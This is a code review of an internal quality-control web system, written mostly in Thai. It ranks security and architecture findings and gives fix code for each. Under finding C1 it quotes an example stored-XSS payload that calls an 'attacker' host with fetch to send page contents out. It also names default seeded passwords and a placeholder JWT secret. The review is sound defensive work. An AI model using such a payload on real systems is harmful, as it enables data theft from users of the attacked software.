# DEVMORE.md — Senior Architecture & Security Review (IQC System)

> วันที่ตรวจ: 2026-06-19
> ขอบเขต: อ่านครบทุกไฟล์ใน `server/` (เต็มทุกไฟล์), `db/`, `middleware/`, scripts, config และโครงสร้าง/แกนหลักของ `client/` (auth, api, SSE, routing, layout, public supplier page) + ตรวจ pattern สำคัญทั่วทั้ง client ด้วย grep
> มุมมอง: Senior Software Architect + Security Reviewer + Production-Grade Reviewer

---

## 0. Executive Summary (อ่านก่อน)

ระบบนี้ **ออกแบบ workflow ได้ดีมาก** — state machine ของ NCR/UAI ชัดเจน, ใช้ transaction + optimistic lock ในจุดสำคัญส่วนใหญ่, parameterized queries (กัน SQL injection ได้จริง), atomic sequence generation, audit log อยู่ใน transaction, single-session enforcement, role middleware ครบ ถือว่าเป็นโค้ดที่มีวินัยสูงเมื่อเทียบกับระบบภายในทั่วไป

แต่มีช่องโหว่ **ระดับ Critical 3 จุด** ที่ต้องแก้ก่อน deploy production จริง และมีจุดที่ "เขียนไว้ใน CLAUDE.md แต่ยังไม่ได้ทำ" หลายข้อ

### ต้องรีบแก้ที่สุด (Top 5)
1. **[C1] Stored XSS / SSRF ใน PDF export** — ฟิลด์จาก Supplier (endpoint สาธารณะ ไม่ต้อง login) ถูกนำไปต่อ string เป็น HTML ดิบแล้ว render ด้วย headless Chromium → ฝัง `<img onerror>`/`<script>` รันได้ ขโมยรูป inline/ทำ SSRF ได้
2. **[C3] File upload ไม่ตรวจ Magic Number + `/uploads` เปิดสาธารณะ** — ขัด CLAUDE.md 3.5 โดยตรง; อัปโหลด HTML/SVG ปลอม mimetype ได้ และไฟล์ทุกอย่าง (รูปตรวจสอบ, ลายเซ็น, ไฟล์ใน Issue Talk, drawing) เปิดดูได้ถ้ารู้ URL
3. **[C2] Secrets/Default credentials** — `.env` มี JWT secret placeholder commit ไว้, `NODE_ENV=development`, seed user 10 คนใช้รหัส `admin1234` เหมือนกันหมดและ log ออก console
4. **[H1] Cookie ไม่มี `secure` flag** — ขัด CLAUDE.md 3.1; session ส่งผ่าน HTTP ได้ใน production
5. **[H4] Migration NCR เปราะ** — rebuild ทั้งตาราง 4 รอบโดยปิด FK; เคยพังจน `ncrs_old` ค้าง (มี `fix-fk.js` ไว้กู้ + อยู่ใน Known Issues) ยังไม่มีระบบ migration versioning

### Technical Debt ที่อันตรายที่สุด
**ระบบ migration ของตาราง `ncrs`** — ทุกครั้งที่เพิ่มสถานะใหม่ ต้อง `RENAME → CREATE → INSERT → DROP` พร้อม `foreign_keys=OFF` + `legacy_alter_table=ON` ถ้า process ตายกลางคันจะเหลือ `ncrs_old` และ FK ของตารางลูกชี้ผิด ระบบมี `fix-fk.js` ที่ใช้ `writable_schema=ON` แก้ `sqlite_master` ตรง ๆ ซึ่งอันตรายมาก นี่คือหนี้ที่จะกลับมากัดทุกครั้งที่แก้ schema

### ถ้าจะ Scale จะติดอะไร
- **SQLite ผู้เขียนได้ทีละคน (single writer)** + ไม่ได้ตั้ง `busy_timeout` → เจอ `SQLITE_BUSY` เมื่อ concurrent writes สูง
- **SSE เก็บ client ใน `Map` ใน memory** → scale หลาย instance ไม่ได้ (ต้อง sticky session/Redis pub-sub)
- **PDF เปิด Chromium ใหม่ทุก request** (html-pdf-node) → กิน RAM/CPU หนัก ไม่มี pool
- **`GET /master/products` ไม่มี pagination + N+1** และ reports aggregate ใน JS → ช้าลงเชิงเส้นตามข้อมูล
- **bcrypt rounds 12 แบบ sync** บล็อค event loop ตอน login burst

---

## 1. โครงสร้าง Project (Structure / Architecture)

### 1.1 ภาพรวม
```
iqc-system/
├── client/   React 18 + Vite + Tailwind + React Query  (~11,300 บรรทัด)
├── server/   Express + better-sqlite3 monolith        (~7,250 บรรทัด)
│   ├── routes/      13 ไฟล์ (auth, master, bills, ncr, supplier, uai, ...)
│   ├── middleware/  auth, requireRole, upload
│   ├── db/          database.js (956), schema.sql (627)
│   └── scripts/     clear-db.js
├── .env      (commit อยู่ในโฟลเดอร์ — ดู C2)
└── fix-fk.js + server/fix-fk.js  (สคริปต์ซ่อม migration — ซ้ำกัน 2 ไฟล์)
```

### 1.2 ประเมิน

| หัวข้อ | ผล | หมายเหตุ |
|---|---|---|
| Folder structure | 🟢 ดี | แยก routes/middleware/db ชัด, client แยก pages/components/hooks/contexts ตามมาตรฐาน |
| Naming convention | 🟢 ดี | สม่ำเสมอ, ภาษาไทยใน UI + อังกฤษใน code |
| Architecture pattern | 🟡 พอใช้ | Monolith route-handler-centric; **ไม่มี service/repository layer** — business logic ปนใน route handler |
| Separation of concerns | 🔴 ต้องปรับ | CLAUDE.md ระบุให้มี `db/transactions.js`, `db/sequences.js`, `db/audit.js` แต่ **ไม่มีไฟล์เหล่านี้** — ทุก transaction inline ใน route, `nextSequence`/`auditLog`/migration อยู่รวมใน `database.js` (956 บรรทัด) |
| Reusability | 🟡 | `getUsersByRole()` ถูก copy-paste ใน 5 ไฟล์ (bills, ncr, uai, supplier, delivery) — ควรเป็น util กลาง |
| Config management | 🔴 | `.env` มีค่า default ที่ commit, ไม่มี `.env.example`, ไม่เห็น `.gitignore` |
| Dependency management | 🟡 | dependencies เหมาะสม แต่ `html-pdf-node` (ลาก Puppeteer/Chromium มาทั้งก้อน) หนักและเสี่ยง, `node-fetch@2` เก่า |

### 1.3 ข้อสังเกตเชิงสถาปัตยกรรม
- **Architecture drift จาก CLAUDE.md**: เอกสารกำหนด `transactions.js / sequences.js / audit.js` แยกไฟล์ แต่ implementation ยุบรวมหมด → คนใหม่อ่าน CLAUDE.md แล้วหาไฟล์ไม่เจอ
- **ไม่มี layer กลางสำหรับ "ส่ง notification + telegram + audit"** — แต่ละ route เขียน loop `getUsersByRole` + `createNotification` + `sendTelegram` เองทุกครั้ง ทำให้ logic การแจ้งเตือนกระจาย แก้ทีต้องไล่หลายไฟล์

---

## 2. ปัญหาจัดลำดับตามความรุนแรง

> รูปแบบแต่ละข้อ: **สาเหตุ → ผลกระทบ → วิธีแก้ (+ ตัวอย่างโค้ด)**

---

### 🔴 CRITICAL

#### C1 — Stored XSS / HTML Injection / SSRF ใน PDF Export
**ไฟล์:** `server/routes/exports.js` (ทั้งไฟล์ — โดยเฉพาะ `/ncr/:id/pdf`, `/uai/:id/pdf`)

**สาเหตุ:** PDF สร้างจากการต่อ string HTML โดยเอาข้อมูลผู้ใช้มาใส่ตรง ๆ **ไม่ผ่าน HTML-escape** เช่น:
```js
// exports.js ~ line 231, 261-265, 466, 576
${item.defect_detail}
`<b>สาเหตุของปัญหา:</b> ${sr.root_cause}`
`<img class="sig-img" src="${s.signature_image}" />`
<p>${uai.reason || '-'}</p>
```
ฟิลด์ `root_cause / corrective_action / preventive_action / respondent_name` มาจาก **endpoint สาธารณะ** `POST /api/supplier/ncr/:token/respond` (ไม่ต้อง login) → Supplier ที่ไม่หวังดีกรอก payload ได้

**ผลกระทบ:**
- เมื่อ QC/ผู้บริหารกด Export PDF, `html-pdf-node` จะ render ด้วย headless Chromium → `<img src=x onerror="fetch('//attacker/?c='+document.body.innerHTML)">` รันได้
- PDF ฝัง **รูป inline base64 ของรูปตรวจสอบทั้งหมด** → exfiltrate ออกได้
- Chromium โหลด resource ภายนอกได้ (เห็นได้จาก `@import` Google Fonts) → **SSRF / blind data exfiltration**
- `src="${signature_image}"` ไม่มี escape เครื่องหมาย `"` → break out attribute ได้

**วิธีแก้:**
1. Escape ทุกค่าก่อนใส่ HTML
2. ปิด network ใน renderer (`html-pdf-node` ใช้ puppeteer options) หรือย้ายไป `@react-pdf/renderer` ที่ไม่ใช้ HTML
3. validate `signature_image` ว่าเป็น `data:image/(png|jpeg);base64,...` เท่านั้น

```js
function esc(s) {
  return String(s ?? '').replace(/[&<>"']/g, c =>
    ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));
}
// ใช้ทุกที่: ${esc(sr.root_cause)} , <p>${esc(uai.reason || '-')}</p>

function safeSig(dataUrl) {
  return /^data:image\/(png|jpe?g);base64,[A-Za-z0-9+/=]+$/.test(dataUrl || '') ? dataUrl : '';
}
// <img src="${safeSig(s.signature_image)}" />
```

---

#### C2 — Secrets / Default Credentials หลุด & ค่า production ไม่ปลอดภัย
**ไฟล์:** `.env`, `server/db/database.js` (seedData), `server/scripts/clear-db.js`

**สาเหตุ:**
- `.env` commit อยู่กับโปรเจกต์: `JWT_SECRET=iqc-system-secret-key-change-in-production`, `NODE_ENV=development`
- `seedData()` สร้าง user 10 บัญชี (รวม `admin`) ด้วยรหัสเดียวกัน `admin1234` rounds 12 แล้ว `console.log('password: admin1234')`
- `BCRYPT_ROUNDS` ไม่มีใน `.env` (auth.js fallback 12 — ใช้ได้ แต่ index.js hardcode 12)

**ผลกระทบ:** ถ้า deploy โดยไม่เปลี่ยน → JWT ปลอม token ได้ทันที (รู้ secret), login admin ด้วยรหัส default ได้ทุกระบบที่ลงตามคู่มือ

**วิธีแก้:**
- ลบ `.env` ออกจาก repo, เพิ่ม `.gitignore` + `.env.example` (ค่าเปล่า)
- บูตเซิร์ฟเวอร์ให้ **fail-fast** ถ้า `JWT_SECRET` สั้น/เป็น default และ `NODE_ENV=production`
- บังคับเปลี่ยนรหัส admin ตอน first login; อย่า log รหัส

```js
// index.js (ต้นไฟล์)
if (process.env.NODE_ENV === 'production') {
  const s = process.env.JWT_SECRET || '';
  if (s.length < 32 || s.includes('change-in-production'))
    throw new Error('JWT_SECRET ไม่ปลอดภัยสำหรับ production');
}
```

---

#### C3 — File Upload ไม่ตรวจ Magic Number + `/uploads` เปิดสาธารณะ
**ไฟล์:** `server/middleware/upload.js`, `server/index.js:25`

**สาเหตุ (ขัด CLAUDE.md 3.5 โดยตรง):**
- ตรวจแค่ `file.mimetype` (ส่งมาจาก client, ปลอมได้) ไม่ตรวจ magic number/file signature
- ชื่อไฟล์ใช้ `Date.now()-Math.random().toString(36)` — ไม่ใช่ UUID (CLAUDE.md สั่งใช้ UUID; package `uuid` มีอยู่แต่ไม่ใช้) และ `Math.random()` เดาได้
- `app.use('/uploads', express.static(...))` — **ไม่มี auth** ใครรู้ชื่อไฟล์ก็เปิดได้

**ผลกระทบ:**
- อัปโหลด `evil.svg`/`evil.html` โดยปลอม mimetype เป็น `image/png` → express.static เสิร์ฟตาม extension เป็น `image/svg+xml` → **Stored XSS**
- ไฟล์ลับทั้งหมด (รูปการตรวจ, ลายเซ็น UAI, ไฟล์แนบ Issue Talk, drawing PDF) **เปิดดูได้โดยไม่ต้อง login**
- multer เซฟไฟล์ลง disk ก่อน validate field ใน handler → ไฟล์ขยะค้าง (ดู M3)

**วิธีแก้:**
```js
// ตรวจ magic number ด้วย file-type หลังรับไฟล์ (memoryStorage) แล้วค่อยเขียน disk
const { fileTypeFromBuffer } = require('file-type');
// rename เป็น UUID + นามสกุลที่ map จาก magic number เท่านั้น
const name = `${require('crypto').randomUUID()}.${detected.ext}`;
```
- ป้องกัน static serving execute: `express.static(dir, { setHeaders: r => r.setHeader('Content-Disposition','attachment') })` หรือเสิร์ฟผ่าน route ที่เช็ค auth + เช็คความเป็นเจ้าของ
- ตั้ง `Content-Security-Policy` + `X-Content-Type-Options: nosniff`

---

### 🟠 HIGH

#### H1 — Cookie ไม่มี `secure` flag (ขัด CLAUDE.md 3.1)
**ไฟล์:** `server/routes/auth.js:10-14`
**สาเหตุ:** `COOKIE_OPTIONS` ไม่มี `secure: process.env.NODE_ENV === 'production'` (CLAUDE.md กำหนดไว้ชัด)
**ผลกระทบ:** ใน production ที่ HTTPS, cookie ยังถูกส่งผ่าน HTTP ได้ → session hijacking ผ่าน MITM
**วิธีแก้:**
```js
const COOKIE_OPTIONS = {
  httpOnly: true, sameSite: 'strict',
  secure: process.env.NODE_ENV === 'production',
  maxAge: 8 * 60 * 60 * 1000,
};
// และใส่ options เดียวกันใน res.clearCookie('token', COOKIE_OPTIONS)
```

#### H2 — ไม่มี Global Rate Limit + ไม่มี Rate Limit บน `/api/supplier` (ขัด CLAUDE.md 3.4)
**ไฟล์:** `server/index.js` (ยืนยันด้วย grep: rateLimit ใช้แค่ใน auth.js, exports.js)
**สาเหตุ:** CLAUDE.md กำหนด `app.use(rateLimit({windowMs:60000,max:200}))` (global) และ `app.use('/api/supplier', rateLimit({max:30}))` แต่ไม่มีทั้งคู่
**ผลกระทบ:** endpoint supplier เป็น public + รับ file upload → spam ยิงทำ **storage DoS**; ไม่มี global limit → brute-force/scraping ได้อิสระ
**วิธีแก้:**
```js
const rateLimit = require('express-rate-limit');
app.use(rateLimit({ windowMs: 60000, max: 200 }));
app.use('/api/supplier', rateLimit({ windowMs: 60000, max: 30 }));
```

#### H3 — Telegram Bot Token หลุดทาง API
**ไฟล์:** `server/index.js:71-82`
**สาเหตุ:** GET `/api/admin/settings/telegram` ตั้งใจ mask token แต่ยังคืน `result.telegram_bot_token` (ค่าจริง) ออกมาด้วย พร้อม `_masked`
```js
result[k] = db.getSetting(k) || '';   // telegram_bot_token = ค่าจริง
if (result.telegram_bot_token) result.telegram_bot_token_masked = '****';
res.json(result);   // ← ส่งทั้งค่าจริงและ masked
```
**ผลกระทบ:** admin (หรือใครก็ตามที่ดู response) เห็น bot token เต็ม → ยึด bot ส่งข้อความปลอมในกลุ่มได้
**วิธีแก้:** `delete result.telegram_bot_token;` ก่อน `res.json` ส่งเฉพาะ masked

#### H4 — Migration ตาราง `ncrs` เปราะ ไม่มี versioning
**ไฟล์:** `server/db/database.js:574-944` + `fix-fk.js`
**สาเหตุ:** มี `migrateNcrStatusConstraint / migrateNcrAddNcp / migrateNcrAddResubmit / migrateNcrAddPendingUai` แต่ละตัว rebuild ตารางทั้งก้อนด้วย `foreign_keys=OFF` + `legacy_alter_table=ON`; ตรวจว่าทำแล้วหรือยังด้วยการ `info.sql.includes('...')` (เปราะ)
**ผลกระทบ:** crash กลางทาง → `ncrs_old` ค้าง, FK ลูกชี้ผิด (อยู่ใน Known Issues, ต้องใช้ `fix-fk.js` + `writable_schema=ON` กู้ — อันตราย); เพิ่มสถานะใหม่ครั้งหน้าต้องเขียน rebuild ก้อนใหม่อีก
**วิธีแก้:**
- ใช้ตาราง `schema_migrations(version, applied_at)` + ไฟล์ migration เรียงเลข run แบบ idempotent ครั้งเดียว
- เก็บ `status` เป็น TEXT ไม่มี CHECK constraint แล้ว validate ที่ app layer (จะไม่ต้อง rebuild ตารางเวลาเพิ่มสถานะ) — นี่คือสาเหตุรากของ migration ทั้งหมด
- ตั้ง `db.pragma('busy_timeout = 5000')`

#### H5 — `GET /master/products` ไม่มี Pagination + N+1 (ขัด CLAUDE.md 2.7)
**ไฟล์:** `server/routes/master.js:1070-1104`
**สาเหตุ:** ดึง products ทั้งหมด แล้ว loop ต่อ product ยิง query `suppliers / colors / current_drawing / image counts` (4 query × N)
**ผลกระทบ:** สินค้าเป็นพัน → หลายพัน query ต่อ 1 request, หน้า Master ค้าง
**วิธีแก้:** ใส่ `LIMIT/OFFSET + q`, รวม sub-data ด้วย JOIN/aggregate หรือ batch `WHERE product_id IN (...)` แทน loop

#### H6 — ไม่มี Idle Timeout / Auto-logout (ขัด CLAUDE.md 3.1)
**ไฟล์:** `client/src/components/Layout/AppLayout.jsx`, `AuthContext.jsx` (ยืนยัน grep: ไม่มี idle/inactivity timer)
**สาเหตุ:** CLAUDE.md กำหนด idle 30 นาที → logout + popup เตือนก่อน 2 นาที แต่ไม่ได้ทำ
**ผลกระทบ:** เครื่องที่ใช้ร่วม (โรงงาน) ค้าง session ถึง 8 ชม. → คนอื่นสวมสิทธิ์
**วิธีแก้:** hook `useIdleTimeout` ฟัง `mousemove/keydown/touchstart` reset timer, 28 นาทีเด้ง warning, 30 นาที `logout()`

#### H7 — Race Condition: `request-uai` และ status update บางจุดไม่มี Optimistic Lock
**ไฟล์:** `server/routes/ncr.js:501`, `server/routes/uai.js:159/171/320`, `server/routes/bills.js:277`
**สาเหตุ:** `UPDATE ncrs SET status='pending_uai' WHERE id=?` ไม่มี `AND status='pending_supplier'`; uai qc-manager-review / reject-exec, bill reject ก็เป็น plain UPDATE
**ผลกระทบ:** purchasing 2 คนกดขอ UAI พร้อมกัน → สร้าง UAI ซ้อน 2 ใบจาก NCR เดียว
**วิธีแก้:** ใส่เงื่อนไขสถานะเดิมทุก transition แล้วเช็ค `changes === 0`
```js
const r = db.prepare("UPDATE ncrs SET status='pending_uai' WHERE id=? AND status='pending_supplier'").run(ncr.id);
if (r.changes === 0) throw new Error('เอกสารถูกดำเนินการแล้ว กรุณารีเฟรช');
```

#### H8 — ไม่มี Audit Log สำหรับ LOGIN / LOGIN_FAILED (ขัด CLAUDE.md 14)
**ไฟล์:** `server/routes/auth.js`
**สาเหตุ:** CLAUDE.md กำหนด event `LOGIN/LOGIN_FAILED` แต่ login/logout ไม่ได้เรียก `auditLog`
**ผลกระทบ:** ตรวจสอบย้อนหลังการบุกรุก/brute-force ไม่ได้, ไม่ตรงข้อกำหนด ISO ด้าน traceability
**วิธีแก้:** `db.auditLog('users', user.id, 'LOGIN', ...)` ตอนสำเร็จ และ `'LOGIN_FAILED'` ตอนรหัสผิด (record_id ใช้ user.id หรือ 0)

#### H9 — Error Handler เปิดเผย `err.message` ทุก environment
**ไฟล์:** `server/index.js:305-316` (และหลาย route คืน `e.message`)
**สาเหตุ:** `res.status(500).json({ error: err.message })` ส่ง internal error/SQL ออก client เสมอ
**ผลกระทบ:** เปิดเผยโครงสร้าง DB / path / stack ช่วย attacker
**วิธีแก้:** production คืนข้อความ generic, log ตัวจริงฝั่ง server เท่านั้น
```js
const msg = process.env.NODE_ENV === 'production' ? 'เกิดข้อผิดพลาดภายในระบบ' : (err.message || '...');
```

---

### 🟡 MEDIUM

| ID | ไฟล์ / จุด | ปัญหา | ผลกระทบ | วิธีแก้ย่อ |
|---|---|---|---|---|
| M1 | bills.js:369-394, 413, 456, 467 | PATCH item ไม่ re-validate `expiry < received` (POST ทำ แต่ PATCH ไม่ทำ) + sub-resource (images/docs/certs) ไม่เช็คว่า item อยู่ใน bill นี้/draft/เจ้าของ | ใส่ของหมดอายุเลี่ยง validation ได้; แนบไฟล์ข้าม bill ได้ | เพิ่ม validation เดียวกันใน PATCH + ตรวจ `item.bill_id===:id && bill.status==='draft' && bill.created_by===user.id` |
| M2 | uai.js:260, schema `uai_signatures.signature_image TEXT` | เก็บ base64 ลายเซ็นใน DB ไม่จำกัดขนาด/ไม่ validate | DB บวม + เป็น vector ของ C1 | จำกัดขนาด + validate data-url + พิจารณาเซฟเป็นไฟล์ |
| M3 | bills.js:179-192/401-407, ncr.js:262-267, supplier.js:79 | ลบเอกสารลบแต่ row ไม่ลบไฟล์จริง; upload ที่ validate fail ทิ้งไฟล์ค้าง | storage leak สะสม | ลบไฟล์ใน transaction/`finally`; cleanup job |
| M4 | schema.sql | ขาด index บน FK ที่ join บ่อย: `supplier_responses.ncr_id`, `ncr_approvals.ncr_id`, `uai_signatures.uai_id`, `product_images.product_id`, `bill_images.bill_id`, `products.supplier_id/group/unit` | query ช้าเมื่อข้อมูลโต (SQLite ไม่ auto-index FK) | เพิ่ม `CREATE INDEX` ให้ครบ (CLAUDE.md 2.6 บอก "บังคับครบทุกตัว") |
| M5 | bills.js (item) | ไม่ validate `qty_passed+qty_failed = qty_sampled ≤ qty_received` | ข้อมูล AQL ผิดเพี้ยน, ISO integrity | validate app layer + (ถ้าได้) CHECK constraint |
| M6 | notifications.js:24 | `parse_mode:'HTML'` แต่ interpolate ค่าผู้ใช้ดิบ | ข้อความที่มี `<>&` ทำ sendMessage 400 → แจ้งเตือนหาย | escape หรือใช้ plain text |
| M7 | supplier.js:95, bills.js:241, ncr.js หลายจุด | เรียก `sendTelegram` (network I/O) **ภายใน** `db.transaction()` และไม่ await | side-effect ใน transaction, error ภายนอกหลุด | ย้าย side-effect ออกหลัง commit |
| M8 | client Bills/New | **ไม่มี auto-draft** `bill_draft` (CLAUDE.md 6 บังคับ) — ยืนยัน grep ไม่พบ | กรอกบิลยาวแล้วปิดเบราว์เซอร์ = ข้อมูลหาย | ทำ auto-save sessionStorage + ถาม restore |
| M9 | ncr.js:225-228, uai.js:80 | GET คืน `supplier_token`/`supplier_link` ให้ทุก role ที่ login | token หลุดเกินคนที่ควรเห็น (เฉพาะ purchasing) | คืน token เฉพาะ role ที่มีสิทธิ์ |
| M10 | (ไม่มี cron) | ไม่มี job archiving notification (2.10) / backup (ข้อ 5) | DB โตไม่หยุด, ไม่มี backup | ตั้ง cron/`node-cron` ตามสเปก |
| M11 | bills.js:29-59 | list bills มี correlated subquery ซ้อน 3 ชั้น (`uncovered_failed_count`) + GROUP_CONCAT | ช้าเมื่อ bill/items เยอะ | ย้ายเป็น JOIN aggregate / materialized count |
| M12 | index.js:28-60, exports.js | SSE เก็บใน `Map` (scale ไม่ได้, login ซ้ำทับ res เดิมไม่ปิด); PDF เปิด Chromium ทุก request | scale-out ไม่ได้, RAM พุ่ง | Redis pub-sub สำหรับ SSE; pool/queue สำหรับ PDF |
| M13 | reports.js | endpoint รายงานไม่ paginate + aggregate ใน JS (`bills.reduce`) | ช่วงวันที่กว้าง = ดึงทุกแถว | aggregate ใน SQL + จำกัดช่วง |
| M14 | middleware/auth.js | role อยู่ใน JWT — เปลี่ยน role ต้อง re-login ถึงมีผล | สิทธิ์ค้างจนกว่าจะ login ใหม่ | ดึง role จาก DB ต่อ request (มี query session อยู่แล้ว ดึง role เพิ่มได้) |

---

### 🟢 LOW

| ID | จุด | ปัญหา | วิธีแก้ |
|---|---|---|---|
| L1 | ncr.js:384-387; reports.js:143/170; root+server `fix-fk.js`; master.js legacy drawing; ncr legacy single-item | Dead/duplicate code: `uaiInfo` ไม่ถูกใช้, `.replace('AND ','AND ')` no-op, fix-fk.js ซ้ำ 2 ไฟล์, endpoint drawing เก่า | ลบทิ้ง |
| L2 | master.js:1290-1291, 1324-1332 | string-interpolate `${today}` ลง SQL (ไม่ใช่ user input แต่ pattern ไม่ดี) | parameterize |
| L3 | ทั้งโปรเจกต์ | **ไม่มี test เลย** (ไม่มี test runner/ไฟล์) | ดู TESTCASES.md |
| L4 | — | ไม่มี Docker/CI/CD/monitoring/error tracking/backup cron | ตั้ง pipeline + Sentry + cron |
| L5 | index.js:20-21 | `express.json({limit:'50mb'})` ใหญ่ | ลดเป็น 1-2mb สำหรับ JSON route, ปล่อยใหญ่เฉพาะ upload |
| L6 | App.jsx:87 vs rolePermissions.js:9 | nav โชว์ "รายงาน" ให้ admin แต่ route/backend ปฏิเสธ admin | เอา admin ออกจาก nav reports หรือเพิ่มสิทธิ์ |
| L7 | schema | `updated_at` ไม่ auto-update (SQLite ไม่มี trigger) | ใส่ใน UPDATE หรือทำ trigger |
| L8 | index.js:62-66, api.js | endpoint `/api/csrf-token` มีแต่ไม่เคย validate ที่ไหน (dead) | ลบทิ้ง (sameSite=strict พอแล้ว) หรือ implement จริง |
| L9 | client | ProtectedRoute เช็ค client เท่านั้น (backend เช็คแล้ว — โอเค) แต่ source map/secret ไม่มีปัญหา | — |

---

## 3. วิเคราะห์ราย Module

### 3.1 Auth & Session (`auth.js`, `middleware/auth.js`)
🟢 single-session enforcement (`session_token`), bcrypt 12, login limiter keyed by username + skipSuccessful
🔴 ไม่มี `secure` cookie (H1), ไม่มี audit login (H8), role ค้างใน JWT (M14)
🟡 limiter keyed by username เปิดช่อง **lockout DoS** (สแปม login ผิดให้เหยื่อ) — ควรมี IP secondary key; change-password ไม่ revoke session อื่น

### 3.2 Bills (`bills.js`)
🟢 transaction + optimistic lock บน approve, validation submit ครบ (ISO: doc/lot/expiry/cert/defect)
🔴 list query หนัก (M11), PATCH item ไม่ validate (M1), ไฟล์ค้างตอนลบ (M3), ไม่ validate qty (M5)
🟡 ownership enforcement ไม่สม่ำเสมอ (bill เช็ค `created_by` แต่ item sub-resource ไม่เช็ค)

### 3.3 NCR (`ncr.js`)
🟢 **หัวใจระบบ — state machine ออกแบบดี** optimistic lock ครบเกือบทุก transition, notification ละเอียด
🔴 `request-uai` ไม่มี lock (H7)
🟡 dead code disposition (L1), GET คืน token ให้ทุก role (M9), re-inspect ไม่ validate qty

### 3.4 UAI (`uai.js`)
🟢 multi-step signature + optimistic lock บน sign, ปิด NCR อัตโนมัติเมื่อครบ
🔴 เก็บ base64 ลายเซ็นไม่จำกัด (M2)
🟡 qc-manager-review/reject-exec ไม่มี lock (H7); audit REOPEN ระบุ old status `closed` ทั้งที่จริงเป็น `pending_uai` (audit ไม่ตรง)

### 3.5 Supplier Public (`supplier.js`)
🔴 ไม่มี rate limit (H2), เป็น input source ของ C1, ไฟล์ค้างเมื่อ validate fail (M3)
🟡 token ใน URL (log/referrer) — รับได้เพราะมีวันหมดอายุ + 64-char hex

### 3.6 Exports/PDF (`exports.js`)
🔴 **C1 ทั้งไฟล์** + Chromium ต่อ request (M12)
🟡 PDF เฉพาะ NCR/UAI ใช้แค่ `auth` (ทุก role export ได้) ทั้งที่ matrix ให้เฉพาะ manager/c-level

### 3.7 Master (`master.js`)
🟢 CRUD + Excel import/export มีวินัย: admin-only, validate, audit ใน transaction, preview mode, กันซ้ำใน-ไฟล์/ใน-DB
🔴 products list ไม่ paginate + N+1 (H5)
🟡 SQL `${today}` interpolation (L2)

### 3.8 Delivery / Issue-Talk / Attendance / Holidays / Reports
🟢 Delivery: transaction + audit + history ผ่าน audit_logs; Issue-Talk: **access control ดี** (creator/participant), unread tracking; Attendance: **geofence ตรวจ server-side (haversine)** ดีมาก
🟡 Delivery ไม่ push SSE event เฉพาะ (`delivery_created/updated` ตาม CLAUDE.md 20); Issue-Talk รับวิดีโอ 100MB ไม่จำกัดรวม + ไฟล์แนบเปิดสาธารณะ (C3); Reports ไม่ paginate (M13)

### 3.9 Database (`database.js`, `schema.sql`)
🟢 WAL, FK on + verify, atomic sequence, audit helper, settings helper, AQL seed (ISO 2859-1) ละเอียด
🔴 migration เปราะ (H4), ขาด index FK (M4), ไม่ตั้ง busy_timeout
🟡 schema ขาด CHECK เชิง qty (M5), `bill_items.product_id` ไม่มี ON DELETE (ต่างจาก convention)

---

## 4. Refactor Plan (ทำเป็นเฟส)

**เฟส 0 — Security hotfix (1-2 วัน, ก่อน prod):** C1, C2, C3, H1, H2, H3
**เฟส 1 — Compliance gap (3-5 วัน):** H6 (idle), H8 (audit login), M8 (auto-draft), M9 (token scope), H9 (error mask), เพิ่ม index M4, busy_timeout
**เฟส 2 — Correctness:** H7 (lock ครบ), M1/M5 (validation), M3 (file cleanup), M2 (signature)
**เฟส 3 — Architecture refactor:**
1. แตก `database.js` → `db/{schema,migrate,sequences,audit,settings}.js` ตาม CLAUDE.md
2. สร้าง `server/lib/notify.js` รวม `getUsersByRole + createNotification + sendTelegram` (เลิก copy-paste, ย้าย side-effect ออกนอก transaction)
3. ทำ `schema_migrations` table + เลิก CHECK constraint บน status → ลบ migration rebuild ทั้งชุด (แก้ราก H4)
4. ย้าย PDF ไป `@react-pdf/renderer` หรือ pool puppeteer + ปิด network
**เฟส 4 — Scale:** pagination products/reports (H5/M13), SSE→Redis (M12), aggregate ใน SQL, พิจารณา Postgres ถ้าโตเกิน single-writer

ตัวอย่าง notify helper:
```js
// server/lib/notify.js
function getUsersByRole(...roles){ const p=roles.map(()=>'?').join(','); return db.prepare(`SELECT id FROM users WHERE role IN (${p}) AND is_active=1`).all(...roles); }
function notifyRoles(roles, {title,message,link}){ for(const u of getUsersByRole(...roles)) createNotification(u.id,title,message,link); }
// เรียกหลัง transaction commit เท่านั้น
```

---

## 5. Technical Debt Register

| # | หนี้ | ความเสี่ยง | ดอกเบี้ยที่จ่าย |
|---|---|---|---|
| TD-1 | Migration `ncrs` rebuild + `writable_schema` recovery | 🔴 สูงสุด | แก้ schema ทีต้องเขียน rebuild ก้อนใหม่ + เสี่ยง data loss |
| TD-2 | Business logic ใน route handler (ไม่มี service layer) | 🟠 | แก้ logic ต้องไล่หลายไฟล์, test ยาก |
| TD-3 | `getUsersByRole` + notify ซ้ำ 5 ไฟล์ | 🟡 | แก้ notification rule ต้องแก้หลายที่ |
| TD-4 | PDF = HTML string + Chromium | 🟠 | XSS surface + perf |
| TD-5 | ไม่มี test | 🟠 | refactor ใด ๆ เสี่ยง regression |
| TD-6 | SQLite single-file | 🟡 | เพดาน concurrency |
| TD-7 | CHECK constraint บน status | 🟡 | ผูกกับ TD-1 |

---

## 6. Security Checklist (OWASP-aligned)

| หมวด | สถานะ | อ้างอิง |
|---|---|---|
| A01 Broken Access Control | 🟡 backend เช็ค role ดี แต่ `/uploads` ไม่มี auth, token หลุดทุก role | C3, M9 |
| A02 Cryptographic Failures | 🔴 cookie ไม่ secure, JWT secret default, token ในกลุ่มแชต | H1, C2, H3 |
| A03 Injection | 🟢 SQL parameterized; 🔴 **HTML injection (PDF)** | C1 |
| A04 Insecure Design | 🟡 ไม่มี idle timeout, ไม่มี global rate limit | H6, H2 |
| A05 Security Misconfiguration | 🔴 NODE_ENV=dev, .env commit, ไม่มี helmet/security headers, error leak | C2, H9 |
| A06 Vulnerable Components | 🟡 html-pdf-node/puppeteer, node-fetch@2 — `npm audit` | L4 |
| A07 Auth Failures | 🟡 single-session ดี แต่ไม่มี login audit, lockout DoS by username | H8 |
| A08 Data Integrity | 🟡 ไม่ validate qty, magic number | M5, C3 |
| A09 Logging/Monitoring | 🔴 ไม่ log login, ไม่มี monitoring/alerting | H8, L4 |
| A10 SSRF | 🔴 headless Chromium โหลด resource ภายนอกจาก HTML ที่ฝังได้ | C1 |

**Security headers ที่ขาด:** ใส่ `helmet()` → CSP, HSTS, X-Content-Type-Options, X-Frame-Options

---

## 7. Performance Checklist

| จุด | ปัญหา | แก้ |
|---|---|---|
